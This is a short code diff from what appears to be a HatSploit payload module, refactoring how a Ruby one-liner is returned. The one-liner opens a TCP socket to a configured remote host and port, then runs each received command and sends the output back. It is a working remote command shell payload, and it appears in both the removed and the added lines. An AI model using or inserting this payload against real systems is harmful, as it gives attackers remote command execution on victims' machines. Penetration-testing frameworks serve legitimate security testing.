@@ -27,11 +27,10 @@ class HatSploitPayload(Payload):
         remote_host = self.handler['RHOST']
         remote_port = self.handler['RPORT']
 
-        payload = (
-                "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\""
-                + remote_host
-                + "\",\""
-                + remote_port
-                + "\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+        return (
+            "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\""
+            + remote_host
+            + "\",\""
+            + remote_port
+            + "\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
         )
-        return payload
